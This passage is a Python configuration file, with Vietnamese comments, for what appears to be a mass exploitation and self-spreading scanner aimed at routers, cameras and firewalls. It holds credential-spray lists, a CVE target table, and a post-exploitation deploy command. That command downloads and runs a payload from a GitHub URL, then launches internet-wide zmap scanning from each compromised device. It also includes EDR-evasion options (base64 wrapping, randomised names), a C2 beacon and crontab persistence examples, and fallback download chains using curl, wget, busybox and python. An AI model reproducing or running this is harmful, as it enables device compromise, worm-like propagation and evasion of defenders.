    return bool(CRED_EXTRA or _cred_file_pairs())


def has_default_creds(cve):
    """True nếu CÓ cred để thử cho CVE (tính cả pool chung nếu bật)."""
    if has_cve_creds(cve):
        return True
    return bool(CRED_TRY_COMMON and COMMON_CRED_CANDIDATES)


def cred_candidates(cve=None, include_common=None, max_n=None):
    """
    Danh sách cặp (user, pass) để thử cho một CVE, theo THỨ TỰ ưu tiên:
      1. cred riêng của CVE (DEFAULT_CRED_CANDIDATES);
      2. cred tay/env (CRED_EXTRA) rồi cred từ file (CRED_FILE);
      3. pool chung (COMMON_CRED_CANDIDATES) nếu include_common/CRED_TRY_COMMON.
    Đã dedupe. max_n>0 → cắt còn max_n cặp.
    """
    if include_common is None:
        include_common = CRED_TRY_COMMON
    seq = []
    if cve:
        seq += list(DEFAULT_CRED_CANDIDATES.get(cve, []))
    seq += list(CRED_EXTRA)
    seq += list(_cred_file_pairs())
    if include_common:
        seq += list(COMMON_CRED_CANDIDATES)
    seq = _dedupe_pairs(seq)
    cap = max_n if (max_n and max_n > 0) else (CRED_MAX_ATTEMPTS or 0)
    if cap and cap > 0:
        seq = seq[:cap]
    return seq


def cred_summary():
    """Tóm tắt nguồn cred đang bật (dùng cho log/kiểm chứng)."""
    return {
        "per_cve": len(DEFAULT_CRED_CANDIDATES),
        "common": len(COMMON_CRED_CANDIDATES) if CRED_TRY_COMMON else 0,
        "extra_env": len(CRED_EXTRA),
        "file": CRED_FILE or "",
        "file_pairs": len(_cred_file_pairs()),
        "max_attempts": CRED_MAX_ATTEMPTS,
        "spray": CRED_SPRAY_ENABLED,
    }

# CVE-2024-45414 (ZTE) — lỗ hổng stack overflow ở webPrivateDecrypt, chưa có
# PoC công khai. File blob payload (target-specific) do người dùng cung cấp;
# nếu file chứa placeholder {cmd} thì module sẽ thay thế bằng lệnh probe.
ZTE_PAYLOAD_FILE = os.path.join(RESULTS_DIR, "zte_45414_payload.bin")
ZTE_ENDPOINT = "/cgi-bin/webPrivateDecrypt"   # tuỳ chỉnh theo firmware đích

# ── Giai đoạn 3: Verifier ───────────────────────────────────────────────
# Phần deploy (chạy sau `id; echo MARKER_<tag>`):
#   - nohup ... &      : tách tiến trình — response không treo, tiến trình sống
#                        tiếp khi kết nối đóng (chống SIGHUP).
#   - >/dev/null 2>&1  : nuốt stdout/stderr — không lộ dấu vết trong response.
#   - curl -fsSL -o    : tải im lặng, theo redirect, fail-fast.
#   - unzip -oq + rm -f: giải nén im lặng, xóa zip sau khi dùng.
#   - sudo -n ... || ...: sudo không tương tác, fallback chạy trực tiếp.
#   - cd /tmp          : không ghi file lộ liễu ở cwd.
# Khi EDR_OBFUSCATE=True, verifier tự bọc phần này bằng base64 (evasion.edr_wrap)
# → process/network chỉ thấy printf|base64 -d|sh, không lộ curl/python3/URL.
VERIFIER_DEPLOY = (
    "nohup sh -c 'cd /tmp && curl -fsSL -o sofia_scanV3.zip "
    "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV3.zip && "
    "unzip -oq sofia_scanV3.zip && rm -f sofia_scanV3.zip && "
    "cd sofia_scan && bash setup.sh && "
    "(sudo -n python3 main.py --generate-ipv4 --engine zmap || "
    "python3 main.py --generate-ipv4 --engine zmap)' >/dev/null 2>&1 &"
)
# Lệnh probe đầy đủ: `id` xác nhận exec + tag để nhận diện output.
# {rand} được verifier thay bằng tag duy nhất của probe.
VERIFIER_COMMAND = "id; echo MARKER_{rand}; " + VERIFIER_DEPLOY

# Webroot thử cho blind-check — static + theo loại thiết bị + phát hiện động.
WEBROOT_CANDIDATES = [
    "/web/", "/tmp/", "/www/", "/usr/www/", "/home/httpd/",
]
# Webroot đặc trưng theo loại thiết bị (dùng khi fingerprint ra device).
DEVICE_WEBROOTS = {
    "hikvision":   ["/web/", "/home/hikvision/web/", "/usr/share/hikvision/web/"],
    "tp-link":     ["/web/", "/tmp/web/", "/usr/www/"],
    "d-link":      ["/web/", "/www/", "/home/httpd/"],
    "tenda":       ["/web/", "/www/", "/usr/www/"],
    "zte":         ["/web/", "/usr/www/", "/home/zte/web/"],
    "dvr":         ["/web/", "/www/", "/mnt/web/"],
    "goahead":     ["/web/", "/www/", "/etc/web/", "/mnt/web/"],
    "boa":         ["/web/", "/www/", "/home/httpd/", "/usr/share/boa/"],
    "lighttpd":    ["/www/", "/srv/www/", "/usr/share/lighttpd/"],
    "draytek":     ["/web/", "/usr/share/www/", "/etc/www/"],
    "sonicwall":   ["/web/", "/usr/web/"],
    "struts":      ["/usr/local/tomcat/webapps/ROOT/", "/opt/tomcat/webapps/ROOT/"],
    "unknown":     [],
}

# ── Giai đoạn 4: Webhook ────────────────────────────────────────────────
WEBHOOK_URL = os.environ.get("SOFIA_WEBHOOK_URL", "")  # VD "https://server/hook"
NOTIFY_ALL = False          # True = gửi webhook cả trường hợp VULN_NO_EXEC
NOTIFY_PROGRESS = True      # True = gửi webhook tiến độ (batch bắt đầu/hoàn tất,
                            # summary cuối) khi đã cấu hình WEBHOOK_URL
# ── Webhook: HMAC + retry (P0 — 0.3 upgrade proposal) ───────────────────
# Xác thực nguồn gửi: nếu WEBHOOK_SECRET khác rỗng, mỗi request kèm header
#   X-Sofia-Signature: sha256=<hex HMAC-SHA256(body)> — receiver phải verify
#   cùng secret để chặn kẻ biết URL giả tạo finding. Lấy từ env
#   SOFIA_WEBHOOK_SECRET (không commit secret vào config).
# Retry: lỗi mạng / HTTP >= 500 được gửi lại tối đa WEBHOOK_RETRY_ATTEMPTS
#   lần với backoff *2^n giây; HTTP 4xx = payload bị từ chối (không retry).
WEBHOOK_SECRET = os.environ.get("SOFIA_WEBHOOK_SECRET", "")
WEBHOOK_RETRY_ATTEMPTS = 3     # số lần gửi lại tối đa khi lỗi tạm thời
WEBHOOK_RETRY_BACKOFF = 1.0    # giây cơ sở backoff: sleep = backoff * 2^n
WEBHOOK_TIMEOUT = 8            # giây timeout mỗi lần gửi

# ── Giai đoạn 1: favicon-hash fingerprint (P1, Shodan-style) ────────────
# Map hash_mmh3(base64(favicon)) -> tên thiết bị/nền tảng. Hash công thức:
#   mmh3.hash(base64.b64encode(favicon_bytes))  (MurmurHash3 x86 32-bit)
# MẶC ĐỊNH TRỐNG — không nhét hash bịa; muốn dùng thì quét thật lấy hash
# (xem results/... favicon_hash trong fingerprints.json) rồi điền vào đây.
FAVICON_HASHES = {}          # VD: {123456789: "hikvision"}
FAVICON_PATH = "/favicon.ico"

# ── Giai đoạn 1: probe model/firmware (P1) ──────────────────────────────
# Mỗi mục: (đường dẫn, regex rút chuỗi) — chỉ probe khi fingerprint đã ra
# marker tương ứng (tiết kiệm request). Regex lấy group đầu tiên khớp.
MODEL_PROBES = {
    "hikvision": ("/ISAPI/System/deviceInfo", r"<modelName>([^<]+)</modelName>"),
    "dahua":     ("/cgi-bin/SystemInfo",      r"<DeviceName>([^<]+)</DeviceName>"),
}
MODEL_TITLE_RES = {   # regex rút model ngay từ title/body (không cần request thêm)
    "tp-link": r"TL-[A-Za-z0-9]+",
    "d-link":  r"DIR-[-A-Za-z0-9]+",
    "tenda":   r"(?:FH|AC|AX)[-A-Za-z0-9]+",
}

# ── Giai đoạn 3: deploy mirror đa hình (P1 OPSEC) ───────────────────────
# Thay vì hardcode 1 URL công khai cố định (dễ bị honeypot/EDR dựng
# signature), verifier chọn NGẪU NHIÊN 1 mirror trong DEPLOY_URLS và đổi
# tên file/thư mục giải nén mỗi lần (evasion.rand_tag). Nếu DEPLOY_SHA256
# khai báo → kiểm tra checksum SHA-256 trước khi giải nén (chống tải file
# bị thay thế từ mirror xâm nhập). Để trống nếu mirror chưa công bố hash.
DEPLOY_URLS = [
    "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV3.zip",
]
DEPLOY_SHA256 = ""          # VD "0123...abc" — verify SHA-256 của file tải về

# ── Giai đoạn 3: cơ chế deploy nâng cao (exploits/deploy.py) ────────────
# Toàn bộ hành vi deploy được điều khiển ở đây. verifier._build_deploy_cmd()
# sẽ dùng exploits.deploy để sinh script sh đa phương án; nếu DEPLOY_URLS
# TRỐNG thì tự động quay về VERIFIER_DEPLOY (tương thích ngược).
#
#   DEPLOY_DELIVERY : "base64" | "plain" | "auto"
#       base64  → request/WAF/proc-list chỉ thấy `B=<b64>; printf|base64 -d|sh`
#                 (không lộ URL + keyword curl/wget/unzip plaintext).
#       plain   → gửi script thô, tự escape nháy đơn an toàn.
#       auto    → base64 khi EDR_OBFUSCATE=True, ngược lại plain.
#   DEPLOY_ATTEMPTS : số vòng thử lại (mỗi vòng quét mọi mirror) — mirror chết
#                     không giết cả chuỗi deploy.
#   DEPLOY_MIN_SIZE : file nhỏ hơn ngưỡng (byte) = tải lỗi/trang chặn → loại.
#   DEPLOY_REQUIRE_HASH : True = thiếu công cụ tính SHA-256 cũng HỦY (fail-closed);
#                         False = chỉ hủy khi hash TÍNH ĐƯỢC mà SAI.
#   DEPLOY_FETCHERS/EXTRACTORS/HASH_TOOLS : danh sách lệnh shell thử lần lượt
#       (curl→wget→busybox→python) — biến `$u/$f` (fetch), `$F` (extract/hash).
#   DEPLOY_RUN_CMD : lệnh chạy chính sau khi vào thư mục payload.
#   DEPLOY_BEACON/DEPLOY_PERSIST : hook tùy chọn (mặc định TẮT).
DEPLOY_ENABLED = True
DEPLOY_DELIVERY = "auto"     # base64 mặc định khi EDR_OBFUSCATE=True
DEPLOY_STAGING_DIR = "/tmp"  # nơi tải/giải nén trên thiết bị
DEPLOY_RANDOMIZE = True      # True = tên file/thư mục ngẫu nhiên mỗi lần
DEPLOY_ATTEMPTS = 2          # số vòng thử lại qua các mirror
DEPLOY_MIN_SIZE = 1024       # byte tối thiểu (0 = bỏ kiểm tra)
DEPLOY_KEEP_ARCHIVE = False  # True = giữ file zip sau khi giải nén
DEPLOY_REQUIRE_HASH = False  # True = fail-closed khi thiếu công cụ hash
DEPLOY_RUN_SETUP = True      # chạy `sh setup.sh` nếu payload có
DEPLOY_ENTRY_HINTS = ["main.py", "setup.sh"]   # dò thư mục vào (zip bọc thêm lớp)
DEPLOY_RUN_CMD = (
    "(sudo -n python3 main.py --generate-ipv4 --engine zmap || "
    "python3 main.py --generate-ipv4 --engine zmap)"
)
DEPLOY_USE_TIMEOUT = False   # True = bọc `timeout DEPLOY_MAX_TIME` (nếu có)
DEPLOY_MAX_TIME = 120        # giây — chỉ dùng khi DEPLOY_USE_TIMEOUT
DEPLOY_BEACON = False        # True = gọi beacon sau khi cài (xác nhận)
DEPLOY_BEACON_CMD = ""       # VD: "curl -fsS -o /dev/null http://C2/b/<tag>"
DEPLOY_PERSIST = False       # True = chạy lệnh persist (tồn tại qua reboot)
DEPLOY_PERSIST_CMD = ""      # VD: "(crontab -l 2>/dev/null; echo '@reboot ...') | crontab -"
DEPLOY_CLEANUP = False       # True = dọn thư mục staging sau khi cài
DEPLOY_CLEANUP_CMD = 'rm -rf "$S" 2>/dev/null || true'
# Chuỗi fetch thử lần lượt: biến `$u` (URL), `$f` (file đích); return 0 = thành công.
DEPLOY_FETCHERS = [
    'command -v curl >/dev/null 2>&1 && curl -fsSL --max-time 60 -o "$f" "$u" && return 0',
    'command -v wget >/dev/null 2>&1 && wget -q -T 60 -O "$f" "$u" && return 0',
    'command -v busybox >/dev/null 2>&1 && busybox wget -q -T 60 -O "$f" "$u" && return 0',
    'command -v python3 >/dev/null 2>&1 && python3 -c "import sys,urllib.request;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" "$u" "$f" && return 0',
    'command -v python >/dev/null 2>&1 && python -c "import sys,urllib;urllib.urlretrieve(sys.argv[1],sys.argv[2])" "$u" "$f" && return 0',
]
# Chuỗi giải nén thử lần lượt: biến `$F` = file zip; return 0 = thành công.
DEPLOY_EXTRACTORS = [
    'command -v unzip >/dev/null 2>&1 && unzip -oq "$F" && return 0',
    'command -v busybox >/dev/null 2>&1 && busybox unzip -oq "$F" && return 0',
    'command -v python3 >/dev/null 2>&1 && python3 -m zipfile -e "$F" . && return 0',
]
# Chuỗi tính SHA-256 thử lần lượt: biến `$F`; in hash ra stdout; return 0 = thành công.
DEPLOY_HASH_TOOLS = [
    "command -v sha256sum >/dev/null 2>&1 && sha256sum \"$F\" | awk '{print $1}' && return 0",
    "command -v busybox >/dev/null 2>&1 && busybox sha256sum \"$F\" | awk '{print $1}' && return 0",
    "command -v openssl >/dev/null 2>&1 && openssl dgst -sha256 \"$F\" | awk '{print $NF}' && return 0",
    "command -v python3 >/dev/null 2>&1 && python3 -c \"import sys,hashlib;print(hashlib.sha256(open(sys.argv[1],'rb').read()).hexdigest())\" \"$F\" && return 0",
]

# ── CVSS severity (P1 — báo cáo HTML/CSV) ───────────────────────────────
# Điểm CVSS v3 best-effort từ advisory công khai (NVD/vendor/CISA KEV).
# QUAN TRỌNG: giá trị xấp xỉ — trước khi dùng cho báo cáo chính thức hãy
# đối chiếu NVD (nvd.nist.gov/vuln/detail/<CVE>) vì điểm có thể thay đổi
# theo thời gian/bảng CVSS. CVE nào thiếu → mặc định 0.0 (không xếp hạng).
CVE_SEVERITY = {
    "CVE-2017-17215": 8.8,   # Huawei HG532 UPnP RCE
    "CVE-2017-5638":  10.0,  # Apache Struts2 S2-045
    "CVE-2018-9866":  9.8,   # SonicWall GMS
    "CVE-2019-17621": 8.8,   # D-Link DIR-859
    "CVE-2020-8515":  9.8,   # DrayTek keyPath
    "CVE-2021-36260": 9.8,   # Hikvision
    "CVE-2021-46422": 9.8,   # Telesquare SDT-CW3B1
    "CVE-2022-30023": 8.8,   # Tenda HG9
    "CVE-2023-1389":  8.8,   # TP-Link Archer AX21
    "CVE-2023-25280": 8.0,   # D-Link DIR-820L (CISA KEV)
    "CVE-2023-27240": 8.8,   # Tenda AX3
    "CVE-2023-33538": 8.8,   # TP-Link TL-WR9xx
    "CVE-2024-3721":  9.8,   # TBK DVR
    "CVE-2024-45414": 9.8,   # ZTE httpd
    "CVE-2025-1316":  8.8,   # Edimax IC-7100
    "CVE-2025-29635": 8.8,   # D-Link DIR-823X
    "CVE-2025-34043": 9.8,   # Vacron NVR
    # Nâng cấp P1 — CVE mồ côi có module:
    "CVE-2018-9995":  9.8,   # XiongMai credential disclosure (unauth)
    "CVE-2022-30525": 9.8,   # Zyxel Firewall ZTP RCE
    "CVE-2018-13379": 10.0,  # FortiOS SSL-VPN path traversal (CISA KEV)
    "CVE-2018-0296":  7.7,   # Cisco ASA directory traversal (auth)
    # Nâng cấp P1 — CVE mồ côi còn lại (fingerprint_only hoặc deterministic):
    "CVE-2021-33044": 9.8,   # Dahua Web Service auth bypass (RPC2_Login)
    "CVE-2021-33045": 9.8,   # Dahua addAdmin (PoC disruptive — không implement)
    "CVE-2020-29583": 9.8,   # Zyxel firewall hardcoded admin (zyad5001)
    "CVE-2022-40684": 9.8,   # FortiOS/FortiProxy auth bypass (CISA KEV)
    "CVE-2018-14847": 9.8,   # MikroTik Winbox directory traversal (CISA KEV)
    "CVE-2021-35395": 9.8,   # Realtek Jungle SDK (AP-Router) buffer overflow
    "CVE-2023-30799": 7.2,   # MikroTik RouterOS priv-esc admin→super-admin (NVD)
    "CVE-2023-22945": 4.3,   # Netgear R7000 (NVD 4.3 — PoC chưa chắc chắn)
    # Lưu ý: CVE-2021-3373, CVE-2024-30877 KHÔNG có bản ghi NVD (RESERVED) —
    # đã đăng ký fingerprint_only nhưng không gán severity để tránh bịa số liệu.
    # Nâng cấp 2026-09 — cụm CVE SSH (cổng 22):
    "CVE-2024-6387":  8.1,   # OpenSSH sshd regreSSHion RCE (NVD 8.1)
    "CVE-2018-10933": 9.1,   # libssh server auth bypass (NVD 9.1)
    "CVE-2024-3094":  10.0,  # xz-utils/liblzma backdoor sshd (NVD 10.0)
    "CVE-2023-48795": 5.9,   # Terrapin SSH prefix truncation (NVD 5.9)
    "CVE-2021-41617": 7.0,   # OpenSSH sshd priv-esc (NVD 7.0)
    "CVE-2023-38408": 9.8,   # OpenSSH ssh-agent RCE (NVD 9.8)
    "CVE-2016-7406":  9.8,   # Dropbear dbclient format string (NVD 9.8)
    "CVE-2020-14145": 5.9,   # OpenSSH client info leak (NVD 5.9)
    "CVE-2016-6210":  5.3,   # OpenSSH username enumeration (NVD 5.3)
}

# Ngưỡng severity theo CVSS v3 để xếp nhãn trong report.
SEVERITY_LEVELS = [
    (9.0, "Critical"), (7.0, "High"), (4.0, "Medium"), (0.1, "Low"), (0.0, "Info"),
]
















# ── Giai đoạn 1: cache fingerprint (P0 — resume/overlap không đo lại) ────
# fingerprint() cache theo (host, port) trong TTL giây; 0 = TẮT cache.
# Dùng khi resume/overlap dải: cùng host:port không phải đo lại từ đầu.
FINGERPRINT_CACHE_TTL = 3600   # giây (1h); 0 = tắt cache hoàn toàn

# ── Giai đoạn 3: Verify — trần biến thể thử nghiệm (chống nổ traffic) ─────
# verifier.build_attempts() sinh tối đa EXPLOIT_MAX_ATTEMPTS biến thể
# (probe × inject) để xác nhận RCE cho mỗi (host, cve). Đặt 0/None = dùng
# mặc định nội bộ. Các giá trị này chặn việc bắn quá nhiều request khi
# thiết bị không phản hồi đúng.
EXPLOIT_MAX_ATTEMPTS = 8       # tổng số biến thể (cmd) tối đa mỗi lần verify
EXPLOIT_PROBE_VARIANTS = 3     # số biến thể nonce số học (payloads.build_probes)
EXPLOIT_INJECT_VARIANTS = 3    # số biến thể bọc ranh giới inject (inject.wrap_variants)

# ── Giai đoạn 2: ENGINE CHỌN CVE THÔNG MINH (cve_selector) ──────────────
# Thay cho việc gán MỌI CVE của cổng rồi cắt top-N theo CVSS (dễ dương giả
# lệch vendor + âm giả CVE điểm thấp nhưng ĐÚNG). Khi bật, CVE được chấm điểm
# khả dụng dựa trên bằng chứng fingerprint (vendor/platform/ssh, version, cổng,
# độ tin cậy module, KEV) trước khi khai thác.
#
#   CVE_SELECT_ENABLED     : True = dùng cve_selector; False = hành vi cũ
#                            (trả nguyên candidates, chỉ sort theo CVSS).
#   CVE_SELECT_MIN_SCORE   : loại CVE có điểm khả dụng < ngưỡng (0.0 = không lọc
#                            theo điểm; CVE explicit/lab vẫn luôn được giữ).
#   CVE_SELECT_DROP_MISMATCH : True = loại CVE lệch vendor rõ ràng so với
#                            fingerprint (mặc định False — giữ lại để tránh âm giả).
#   CVE_SELECT_WEIGHTS     : dict ghi đè trọng số chấm điểm của cve_selector
#                            (rỗng = dùng DEFAULT_WEIGHTS trong cve_selector.py).
#                            VD: {"cvss": 4.0, "vendor": 6.0, "mismatch": -6.0}
CVE_SELECT_ENABLED = True
CVE_SELECT_MIN_SCORE = 0.0
CVE_SELECT_DROP_MISMATCH = False
CVE_SELECT_WEIGHTS = {}
